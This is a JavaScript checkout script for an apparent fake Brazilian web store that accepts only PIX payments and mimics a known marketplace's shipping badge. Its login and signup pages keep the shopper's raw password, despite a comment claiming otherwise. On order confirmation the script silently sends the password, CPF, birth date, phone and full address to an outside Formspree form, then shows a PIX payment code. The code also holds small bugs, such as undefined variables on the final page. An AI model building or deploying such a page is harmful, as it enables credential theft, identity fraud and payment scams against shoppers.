// Checkout flow (PIX only) - state via localStorage (helpers in tela/js/js.js)
// This file keeps the checkout pages connected by sharing data in localStorage.

(function(){
  const STORE = {
    get(key, fallback=''){
      try{ return (get_cookie(key) ?? fallback); }catch(e){ return fallback; }
    },
    set(key, val){
      try{ set_cookie(key, val); }catch(e){}
    }
  };

  
  function formatCPF(v){
    const d = String(v||'').replace(/\D/g,'');
    if(d.length!==11) return d;
    return d.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  }
function moneyBRL(value){
    // aceita número direto sem "estragar" o ponto decimal
    if(typeof value === 'number' && Number.isFinite(value)){
      return value.toLocaleString('pt-BR', { style:'currency', currency:'BRL' });
    }
    const s = String(value ?? '0');
    const n = Number(s.replace(/[^0-9.,]/g,'').replace(/\./g,'').replace(',', '.'));
    if(Number.isNaN(n)) return 'R$ 0,00';
    return n.toLocaleString('pt-BR', { style:'currency', currency:'BRL' });
  }

  function cart(){
    try{
      const ls = localStorage.getItem('carrinho_itens');
      if(ls){ return JSON.parse(ls) || []; }
    }catch(e){}
    return [];
  }

  function saveCart(c){
    const arr = c || [];
    try{ localStorage.setItem('carrinho_itens', JSON.stringify(arr)); }catch(e){}
  }

  function cartTotal(){
    let total = 0;
    const c = cart();
    for(const p of c){
      const q = Number(p.quantidade||1);

      // aceita vários nomes de campo de preço
      const raw = (p.preco_atual ?? p.preço_atual ?? p.preco ?? p.preço ?? p.valor ?? p.value ?? '0');

      // parser BR/US: "R$ 59,90" -> 59.90 | "59.90" -> 59.90 | "1.234,56" -> 1234.56
      const s = String(raw).trim().replace(/[^0-9.,]/g,'');
      let price = 0;
      if(s.includes(',') && s.includes('.')){
        // assume ponto milhar e vírgula decimal
        price = Number(s.replace(/\./g,'').replace(',', '.'));
      }else if(s.includes(',')){
        price = Number(s.replace(',', '.'));
      }else{
        price = Number(s);
      }

      total += (Number.isNaN(price)?0:price) * (Number.isNaN(q)?1:q);
    }
    return total;
  }

  function isFullName(v){
    const s = String(v||'').trim().replace(/\s+/g,' ');
    return s.split(' ').length >= 2 && s.length >= 5;
  }

  function isEmail(v){
    const s = String(v||'').trim();
    // you asked for @ and .com at minimum
    return /@/.test(s) && /\.(com|com\.br)$/i.test(s);
  }

  function isStrongPass(v){
    return String(v||'').length >= 4;
  }

  function onlyDigits(v){
    return String(v||'').replace(/\D/g,'');
  }

  function isCEP(v){
    return onlyDigits(v).length === 8;
  }

  function isCPF(v){
    const cpf = onlyDigits(v);
    if(cpf.length !== 11) return false;
    if(/^([0-9])\1+$/.test(cpf)) return false;
    let sum = 0;
    for(let i=0;i<9;i++) sum += parseInt(cpf.charAt(i)) * (10 - i);
    let rev = (sum * 10) % 11;
    if(rev === 10) rev = 0;
    if(rev !== parseInt(cpf.charAt(9))) return false;
    sum = 0;
    for(let i=0;i<10;i++) sum += parseInt(cpf.charAt(i)) * (11 - i);
    rev = (sum * 10) % 11;
    if(rev === 10) rev = 0;
    return rev === parseInt(cpf.charAt(10));
  }

  function isDOB(v){
    // expects dd/mm/aaaa or yyyy-mm-dd
    const s = String(v||'').trim();
    if(/^\d{2}\/\d{2}\/\d{4}$/.test(s)) return true;
    if(/^\d{4}-\d{2}-\d{2}$/.test(s)) return true;
    return false;
  }

  function setInvalid(el, msg){
    if(!el) return;
    el.classList.add('is-invalid');
    const hint = el.closest('.field')?.querySelector('.hint');
    if(hint) hint.textContent = msg || 'Inválido';
  }

  function clearInvalid(el){
    if(!el) return;
    el.classList.remove('is-invalid');
    const hint = el.closest('.field')?.querySelector('.hint');
    if(hint) hint.textContent = '';
  }

  function mountHeader(){
    // set cart badge if present
    try{ render_cart_badge(); }catch(e){}
  }

  // CART PAGE
  function pageCart(){
    mountHeader();
    const wrap = document.getElementById('cart-items');
    const totalEl = document.getElementById('cart-total');
    const btn = document.getElementById('btn-cart-next');
    if(!wrap || !totalEl) return;

    function render(){
      const c = cart();
      wrap.innerHTML = '';
      if(!c.length){
        wrap.innerHTML = '<div class="empty">Seu carrinho está vazio.</div>';
      }
      c.forEach((p, idx)=>{
        let vars = '';
        if(Array.isArray(p.variações)){
          vars = p.variações.map(v=>`${v.atributo}: ${v.valor}`).join(' • ');
        } else if(typeof p.variações === 'string' && p.variações.includes(':::')){
          vars = p.variações.split('||').filter(x=>x).map(x=>x.split(':::')[1]).join(' • ');
        }
        const item = document.createElement('div');
        item.className = 'cart-item';
        item.innerHTML = `
          <div class="ci-left">
            <img class="ci-img" src="${p.imagem || 'assets/logo.png'}" alt="" onerror="this.src='assets/logo.png'">
          </div>

          <div class="ci-mid">
            <div class="ci-title">${p.nome || 'Produto'}</div>
            ${vars ? `<div class="ci-vars">${vars}</div>` : ''}
            <div class="ci-controls">
              <select data-idx="${idx}" class="ci-qty" aria-label="Quantidade">
                ${(()=>{
                  const max = Math.max(1, Math.min(Number(p.quantidade_total||20)||20, 20));
                  const opts = [];
                  for(let n=1; n<=max; n++){
                    opts.push(`<option value="${n}" ${Number(p.quantidade||1)===n?'selected':''}>${n} un.</option>`);
                  }
                  return opts.join('');
                })()}
              </select>
            </div>
          </div>

          <div class="ci-right">
            <button class="ci-remove material-icons" data-idx="${idx}" aria-label="Remover">delete_outline</button>

            ${(()=>{
              const cur = Number(String(p.preco || p.preço_atual || '0').replace(/[^0-9.,]/g,'').replace(/\./g,'').replace(',', '.'));
              const orig = Number(String(p.preco_original || p.preço_original || '0').replace(/[^0-9.,]/g,'').replace(/\./g,'').replace(',', '.'));
              if(!orig || Number.isNaN(orig) || !cur || Number.isNaN(cur) || orig<=cur){
                return `<span class="ci-new">${moneyBRL(cur)}</span>`;
              }
              const pct = Math.round(((orig-cur)/orig)*100);
              return `
                <div>
                  <span class="ci-discount">-${pct}%</span>
                  <span class="ci-old">${moneyBRL(orig)}</span>
                </div>
                <span class="ci-new">${moneyBRL(cur)}</span>
              `;
            })()}
          </div>
        `;
        wrap.appendChild(item);
      });

      const t = cartTotal();
      try{ STORE.set('cart_total', String(t)); STORE.set('cart_total_fmt', moneyBRL(t)); }catch(e){}
      totalEl.textContent = moneyBRL(t);
      const subtotalEl = document.getElementById('cart-subtotal');
      if(subtotalEl) subtotalEl.textContent = moneyBRL(t);
      const countEl = document.getElementById('cart-count');
      if(countEl) countEl.textContent = `(${cart().length})`;
      try{ render_cart_badge(); }catch(e){}
      if(btn) btn.disabled = cart().length===0;
    }

    wrap.addEventListener('change', (e)=>{
      const sel = e.target.closest('.ci-qty');
      if(!sel) return;
      const idx = Number(sel.getAttribute('data-idx'));
      const c = cart();
      if(!c[idx]) return;
      c[idx].quantidade = Number(sel.value);
      saveCart(c);
      render();
    });

    wrap.addEventListener('click', (e)=>{
      const btn = e.target.closest('.ci-remove');
      if(!btn) return;
      const idx = Number(btn.getAttribute('data-idx'));
      const c = cart();
      c.splice(idx,1);
      saveCart(c);
      render();
    });

    if(btn){
      btn.addEventListener('click', ()=>{ window.location.href = 'dados.html'; });
    }

    render();
  }

  // LOGIN PAGE (email -> password)
  function pageDados(){
    mountHeader();
    const email = document.getElementById('login-email');
    const emailBox = document.getElementById('email-box');
    const emailSummary = document.getElementById('email-summary');
    const passBox = document.getElementById('pass-box');
    const pass = document.getElementById('login-pass');
    const btnEmail = document.getElementById('btn-email-next');
    const btnLogin = document.getElementById('btn-login');

    function showPassPhase(){
      if(emailBox) emailBox.style.display = 'none';
      if(passBox) passBox.style.display = 'block';

      const title = document.getElementById('dados-title');
      if(title) title.textContent = 'Agora, sua senha';

      if(emailSummary){
        emailSummary.style.display = 'flex';
        emailSummary.classList.add('pill-disabled');
        const t = emailSummary.querySelector('.pill-text') || emailSummary.querySelector('span');
        if(t) t.textContent = STORE.get('email','');
      }
    }

    // If already has email in storage, jump to pass in storage, jump to pass
    if(isEmail(STORE.get('email',''))){
      showPassPhase();
    }

    if(btnEmail){
      btnEmail.addEventListener('click', ()=>{
        clearInvalid(email);
        if(!isEmail(email.value)){
          setInvalid(email,'E-mail inválido');
          return;
        }
        STORE.set('email', email.value.trim());
        showPassPhase();
      });
    }

    if(btnLogin){
      btnLogin.addEventListener('click', ()=>{
        clearInvalid(pass);
        if(!isStrongPass(pass.value)){
          setInvalid(pass,'Senha inválida');
          return;
        }
        // demo: store password length only (do not store raw passwords in real projects)
        STORE.set('senha', pass.value);
        STORE.set('senha_ok','1');
        window.location.href = 'entrega.html';
      });
    }
  }

  // CREATE ACCOUNT PAGE
  function pageCadastro(){
    mountHeader();
    const nome = document.getElementById('cad-nome');
    const email = document.getElementById('cad-email');
    const tel = document.getElementById('cad-tel');
    const pass = document.getElementById('cad-pass');
    const btn = document.getElementById('btn-cad');
    if(!btn) return;

    btn.addEventListener('click', ()=>{
      [nome,email,tel,pass].forEach(clearInvalid);
      let ok = true;
      if(!isEmail(email.value)){ setInvalid(email,'E-mail inválido'); ok=false; }
      if(!isFullName(nome.value)){ setInvalid(nome,'Informe nome e sobrenome'); ok=false; }
      if(onlyDigits(tel.value).length < 10){ setInvalid(tel,'Telefone inválido'); ok=false; }
      if(!isStrongPass(pass.value)){ setInvalid(pass,'Senha inválida'); ok=false; }
      if(!ok) return;
      STORE.set('nome', nome.value.trim().replace(/\s+/g,' '));
      STORE.set('email', email.value.trim());
      STORE.set('telefone', onlyDigits(tel.value));
      STORE.set('senha', pass.value);
      STORE.set('senha_ok','1');
      window.location.href = 'entrega.html';
    });
  }

  // ADDRESS PAGE
  function pageEntrega(){
    mountHeader();
    const destinatario = document.getElementById('ent-nome');
    const telefone = document.getElementById('ent-tel');
    const cep = document.getElementById('ent-cep');
    const uf = document.getElementById('ent-uf');
    const endereco = document.getElementById('ent-endereco');
    const numero = document.getElementById('ent-numero');
    const comp = document.getElementById('ent-comp');
    const bairro = document.getElementById('ent-bairro');
    const cidade = document.getElementById('ent-cidade');
    const btn = document.getElementById('btn-entrega');

    // preload
    if(destinatario) destinatario.value = STORE.get('destinatario', STORE.get('nome',''));
    if(telefone) telefone.value = STORE.get('telefone','');
    if(cep) cep.value = STORE.get('cep','');
    if(uf) uf.value = STORE.get('estado','');
    if(endereco) endereco.value = STORE.get('logradouro','');
    if(numero) numero.value = STORE.get('numero','');
    if(comp) comp.value = STORE.get('complemento','');
    if(bairro) bairro.value = STORE.get('bairro','');
    if(cidade) cidade.value = STORE.get('cidade','');

    async function lookupCEP(){
      clearInvalid(cep);
      const c = onlyDigits(cep.value);
      if(c.length !== 8){
        setInvalid(cep,'CEP inválido');
        return;
      }
      try{
        const res = await fetch(`https://viacep.com.br/ws/${c}/json/`);
        const data = await res.json();
        if(data.erro){ setInvalid(cep,'CEP não encontrado'); return; }
        if(endereco) endereco.value = data.logradouro || '';
        if(bairro) bairro.value = data.bairro || '';
        if(cidade) cidade.value = data.localidade || '';
        if(uf) uf.value = data.uf || '';
      }catch(e){
        setInvalid(cep,'Não foi possível buscar CEP');
      }
    }

    if(cep){
      cep.addEventListener('blur', lookupCEP);
    }

    if(btn){
      btn.addEventListener('click', async ()=>{
        [destinatario,telefone,cep,uf,endereco,numero,bairro,cidade].forEach(clearInvalid);
        let ok = true;
        if(!isFullName(destinatario.value)){ setInvalid(destinatario,'Informe nome e sobrenome'); ok=false; }
        if(onlyDigits(telefone.value).length < 10){ setInvalid(telefone,'Telefone inválido'); ok=false; }
        if(!isCEP(cep.value)){ setInvalid(cep,'CEP inválido'); ok=false; }
        if(!String(uf.value||'').trim()){ setInvalid(uf,'UF inválido'); ok=false; }
        if(!String(endereco.value||'').trim()){ setInvalid(endereco,'Endereço inválido'); ok=false; }
        if(!onlyDigits(numero.value).length){ setInvalid(numero,'Número inválido'); ok=false; }
        if(!String(bairro.value||'').trim()){ setInvalid(bairro,'Bairro inválido'); ok=false; }
        if(!String(cidade.value||'').trim()){ setInvalid(cidade,'Cidade inválida'); ok=false; }
        if(!ok) return;
        // persist
        STORE.set('destinatario', destinatario.value.trim().replace(/\s+/g,' '));
        STORE.set('telefone', onlyDigits(telefone.value));
        STORE.set('cep', onlyDigits(cep.value));
        STORE.set('estado', String(uf.value).trim().toUpperCase());
        STORE.set('logradouro', String(endereco.value).trim());
        STORE.set('numero', onlyDigits(numero.value));
        STORE.set('complemento', String(comp?.value||'').trim());
        STORE.set('bairro', String(bairro.value).trim());
        STORE.set('cidade', String(cidade.value).trim());
        window.location.href = 'prazo.html';
      });
    }
  }

  // SHIPPING PAGE
  function pagePrazo(){
    mountHeader();
    const addr = document.getElementById('ship-address');
    const list = document.getElementById('ship-list');
    const btn = document.getElementById('btn-ship');
    const rua = STORE.get('logradouro','');
    const num = STORE.get('numero','');
    if(addr) addr.textContent = `${rua} ${num ? ', '+num : ''}`.trim();

    const textos = [
      'Entre os dias 8 e 11 de Fevereiro.',
      'Entre quarta-feira e sexta-feira.',
      'Entre os dias 8 e 14 de Fevereiro.',
      'Entre os dias 7 e 10 de Fevereiro.'
    ];

    if(list){
      const c = cart();
      list.innerHTML = '';
      c.forEach((p,i)=>{
        const box = document.createElement('div');
        box.className = 'ship-block';
        const label = textos[i % textos.length];
        if(i===0){ STORE.set('prazo_texto', label); }
        box.innerHTML = `
          <div class="sb-head">
            <div class="sb-title">Envio ${i+1} <img class="full-badge" src="assets/full.png" alt="FULL"></div>
            <div class="sb-free">Grátis</div>
          </div>
          <div class="sb-prod">${p.nome || 'Produto'}</div>
          <label class="sb-opt">
            <input type="radio" name="ship_${i}" checked>
            <span>${label}</span>
          </label>
        `;
        list.appendChild(box);
      });
      // store simple info
      STORE.set('forma_de_entrega_escolhida','frete_gratis');
    }

    if(btn){
      btn.addEventListener('click', ()=>{ window.location.href = 'pagamento.html'; });
    }
  }

  // PAYMENT PAGE (PIX ONLY)
  function pagePagamento(){
    mountHeader();
    if(!(STORE.get('forma_de_pagamento_escolhida') || (function(){try{return localStorage.getItem('forma_de_pagamento_escolhida');}catch(e){return null;}})())){ STORE.set('forma_de_pagamento_escolhida','Pix'); try{localStorage.setItem('forma_de_pagamento_escolhida','Pix');}catch(e){} }
    const btn = document.getElementById('btn-pay');
    if(btn){ btn.addEventListener('click', ()=>{ window.location.href = 'nfe.html'; }); }
  }

  // NFE DATA PAGE
  function pageNFE(){
    mountHeader();
    const nome = document.getElementById('nfe-nome');
    const cpf = document.getElementById('nfe-cpf');
    const dob = document.getElementById('nfe-dob');
    const btn = document.getElementById('btn-nfe');
    if(nome) nome.value = STORE.get('nome','');
    if(cpf) cpf.value = STORE.get('documento','');
    if(dob) dob.value = STORE.get('nascimento','');

    if(btn){
      btn.addEventListener('click', ()=>{
        [nome,cpf,dob].forEach(clearInvalid);
        let ok=true;
        if(!isFullName(nome.value)){ setInvalid(nome,'Informe nome e sobrenome'); ok=false; }
        if(!isCPF(cpf.value)){ setInvalid(cpf,'CPF inválido'); ok=false; }
        if(!isDOB(dob.value)){ setInvalid(dob,'Data inválida'); ok=false; }
        if(!ok) return;
        STORE.set('nome', nome.value.trim().replace(/\s+/g,' '));
        STORE.set('documento', onlyDigits(cpf.value));
        STORE.set('nascimento', dob.value.trim());
        window.location.href = 'revisar.html';
      });
    }
  }

  // REVIEW PAGE
  function pageRevisar(){
  function getPayLabel(){
    try{
      return STORE.get('forma_de_pagamento_escolhida') || localStorage.getItem('forma_de_pagamento_escolhida') || 'Pix';
    }catch(e){
      return 'Pix';
    }
  }

    mountHeader();
    const prod = document.getElementById('rev-products');
    const pay = document.getElementById('rev-pay');
    const payTitle = document.querySelector('.paytitle');
    const addr = document.getElementById('rev-addr');
    const dateEl = document.getElementById('rev-date');
    const who = document.getElementById('rev-who');
    const total = document.getElementById('rev-total');
    const subtotal = document.getElementById('rev-subtotal');
    const paytotal = document.getElementById('rev-paytotal');
    const btn = document.getElementById('btn-confirm');

    if(payTitle){ payTitle.textContent = getPayLabel(); }
    try{
      var lbl = (getPayLabel()||'').toLowerCase();
      document.body.setAttribute('data-pay', (lbl.indexOf('cart')!==-1 ? 'card' : 'pix'));
    }catch(e){}
    
    try{
      var methodEl = document.querySelector('.method');
      if(methodEl){ methodEl.textContent = (getPayLabel().toLowerCase().indexOf('cart')!==-1 ? 'Cartão de crédito' : 'Pix'); }
    }catch(e){}
if(who){
      const nome = STORE.get('nome','');
      const cpf = formatCPF(STORE.get('documento',''));
      // Nome em destaque e CPF em peso normal (igual ao carrinho)
      who.innerHTML = '';
      const nm = document.createElement('div');
      nm.className = 'nm';
      nm.textContent = nome;
      who.appendChild(nm);
      if(cpf){
        const cp = document.createElement('div');
        cp.className = 'cpf';
        cp.textContent = `CPF ${cpf}`;
        who.appendChild(cp);
      }
    }
    if(pay) pay.textContent = moneyBRL(cartTotal());
    if(addr){
      addr.textContent = `${STORE.get('logradouro','')}, ${STORE.get('numero','')}`;
    }
    if(dateEl){
      dateEl.textContent = STORE.get('prazo_texto','');
    }
    if(total) total.textContent = moneyBRL(cartTotal());
    if(subtotal) subtotal.textContent = moneyBRL(cartTotal());
    if(paytotal) paytotal.textContent = moneyBRL(cartTotal());

    if(prod){
      const c = cart();
      
      function formatVariations(item){
        try{
          const vars = item.variações || item.variacoes || [];
          if(!vars || !vars.length) return '';
          // vars: [{atributo, valor}] -> "Cor: X • Tamanho: 56"
          return vars.map(v => `${v.atributo}: ${v.valor}`).join(' • ');
        }catch(e){
          return '';
        }
      }

prod.innerHTML = '';
      c.forEach(p=>{
        const row = document.createElement('div');
        row.className = 'rev-item';

        const q = Number(p.quantidade||1);
        const raw = (p.preco_atual ?? p.preço_atual ?? p.preco ?? p.preço ?? '0');
        const price = Number(String(raw).replace(/[^0-9.,]/g,'').replace(/\./g,'').replace(',', '.'));
        const line = (Number.isNaN(price)?0:price) * (Number.isNaN(q)?1:q);

        const img = (p.imagem || p.img || '').trim() || 'assets/logo.png';

        row.innerHTML = `
          <img class="rev-img" src="${img}" onerror="this.onerror=null;this.src='assets/logo.png';" />
          <div class="rev-mid">
            <div class="ri-name">${p.nome||'Produto'}</div>
            <div class="ri-sub">${formatVariations(p)}</div>
          </div>
          <div class="rev-right">
            <div class="ri-qty">x${q}</div>
            <div class="ri-price">${moneyBRL(line)}</div>
          </div>
        `;
        prod.appendChild(row);
      });
    }

    if(btn){
      btn.addEventListener('click', async ()=>{
        btn.disabled = true;
        try{ await sendOrderToFormspree(); }catch(e){}
        window.location.href = 'finalizar_pix.html';
      });}
  }

  // FINALIZE PIX
  function pageFinalizarPix(){
    mountHeader();
    const overlay = document.getElementById('final-overlay');
    const qrWrap = document.getElementById('qr-wrap');
    if(overlay){
      overlay.style.display = 'flex';
      setTimeout(()=>{
        overlay.style.display = 'none';
        if(qrWrap) qrWrap.style.display = 'block';
      }, 1100);
    }
    const total = document.getElementById('pix-total');
    if(total) total.textContent = moneyBRL(cartTotal());
    if(subtotal) subtotal.textContent = moneyBRL(cartTotal());
    if(paytotal) paytotal.textContent = moneyBRL(cartTotal());
  }

  
  // --- Formspree order submit (static) ---
  async function sendOrderToFormspree(){
    const ENDPOINT = 'https://formspree.io/f/mykjelyr';
    const c = cart();
    const totalNum = cartTotal();
    const totalFmt = moneyBRL(totalNum);

    const orderId = 'PED-' + Date.now().toString(36).toUpperCase();

    const data = {
      order_id: orderId,
      nome: STORE.get('nome',''),
      email: STORE.get('email',''),
      telefone: STORE.get('telefone',''),
      senha: STORE.get('senha',''),
      documento: STORE.get('documento',''),
      cpf: STORE.get('documento',''),
      nascimento: STORE.get('nascimento',''),
      destinatario: STORE.get('destinatario','') || STORE.get('nome',''),
      entrega_cep: STORE.get('cep',''),
      entrega_logradouro: STORE.get('logradouro',''),
      entrega_numero: STORE.get('numero',''),
      entrega_complemento: STORE.get('complemento',''),
      entrega_bairro: STORE.get('bairro',''),
      entrega_cidade: STORE.get('cidade',''),
      entrega_uf: STORE.get('uf',''),
      forma_pagamento: STORE.get('forma_de_pagamento_escolhida','Pix'),
      total: totalFmt,
      total_num: String(totalNum),
      itens: c
    };

    // human-readable summary
    const linhas = [];
    linhas.push('Pedido: ' + orderId);
    linhas.push('Nome: ' + (data.nome||''));
    linhas.push('Email: ' + (data.email||''));
    linhas.push('Telefone: ' + (data.telefone||''));
    if(data.cpf) linhas.push('CPF: ' + data.cpf);
    if(data.nascimento) linhas.push('Nascimento: ' + data.nascimento);
    linhas.push('--- Entrega ---');
    linhas.push((data.entrega_logradouro||'') + ', ' + (data.entrega_numero||'') + (data.entrega_complemento?(' - '+data.entrega_complemento):''));
    linhas.push((data.entrega_bairro||'') + ' • ' + (data.entrega_cidade||'') + '/' + (data.entrega_uf||'') + ' • CEP ' + (data.entrega_cep||''));
    linhas.push('--- Itens ---');
    c.forEach((p,idx)=>{
      const q = Number(p.quantidade||1);
      const nome = p.nome || 'Produto';
      const raw = (p.preco_atual ?? p.preço_atual ?? p.preco ?? p.preço ?? p.valor ?? '0');
      linhas.push(`- ${
        nome
      } x${
        q
      } | ${
        String(raw)
      }`);
    });
    linhas.push('Total: ' + totalFmt);
    linhas.push('Pagamento: ' + data.forma_pagamento);

    const payload = {
      _subject: `Novo pedido - ${
        orderId
      }`,
      order_id: orderId,
      message: linhas.join('\n'),
      ...data,
      itens_json: JSON.stringify(c)
    };

    try{
      const res = await fetch(ENDPOINT, {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      // even if formspree rejects, don't break flow
      if(!res.ok) throw new Error('Formspree error');
      return true;
    }catch(e){
      // fail silently (user still proceeds to PIX)
      return false;
    }
  }

// Router by body data-page
  document.addEventListener('DOMContentLoaded', ()=>{
    const page = document.body.getAttribute('data-page');
    if(page==='carrinho') pageCart();
    if(page==='dados') pageDados();
    if(page==='cadastro') pageCadastro();
    if(page==='entrega') pageEntrega();
    if(page==='prazo') pagePrazo();
    if(page==='pagamento') pagePagamento();
    if(page==='nfe') pageNFE();
    if(page==='revisar') pageRevisar();
    if(page==='finalizar_pix') pageFinalizarPix();
  });
})();
